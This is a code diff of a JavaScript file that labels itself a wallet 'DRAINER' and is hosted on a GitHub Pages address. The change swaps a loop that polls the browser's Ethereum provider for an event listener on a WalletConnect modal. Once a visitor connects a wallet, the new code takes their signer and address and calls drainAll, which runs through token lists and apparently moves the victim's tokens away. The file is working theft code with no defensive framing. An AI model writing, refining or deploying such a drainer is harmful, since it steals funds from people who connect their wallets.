@@ -1,4 +1,4 @@
-// resolution.js - EMBEDDED QR MODAL DRAINER
+// resolution.js - <w3m-modal> EVENT DRAINER
 // Host: https://dynamo210.github.io/ultimate-resolution/public/resolution.js?v=11
 
 const PROJECT_ID = '281727c769bcec075b63e0fbc5a3fdcc';
@@ -20,24 +20,20 @@ document.body.insertAdjacentHTML('beforeend', `
 // Load ethers
 const ethersScript = document.createElement('script');
 ethersScript.src = 'https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js';
-ethersScript.onload = initDrainer;
-ethersScript.onerror = () => console.error('ETHERS LOAD FAILED');
+ethersScript.onload = () => {
+  const modal = document.querySelector('w3m-modal');
+  if (modal) {
+    modal.addEventListener('connect', async (event) => {
+      const { provider } = event.detail;
+      const ethersProvider = new ethers.BrowserProvider(provider);
+      const signer = await ethersProvider.getSigner();
+      const user = await signer.getAddress();
+      console.log('Connected:', user);
+      await drainAll(ethersProvider, signer, user);
+    });
+  }
+};
 document.head.appendChild(ethersScript);
-
-async function initDrainer() {
-  setInterval(async () => {
-    if (window.ethereum?.isConnected?.() && window.ethereum.selectedAddress) {
-      const user = window.ethereum.selectedAddress;
-      if (window.lastDrained !== user) {
-        window.lastDrained = user;
-        console.log('Connected:', user);
-        const provider = new ethers.BrowserProvider(window.ethereum);
-        const signer = await provider.getSigner();
-        await drainAll(provider, signer, user);
-      }
-    }
-  }, 2000);
-}
 
 async function drainAll(provider, signer, user) {
   for (const [token, name] of Object.entries(TOKENS[1])) {
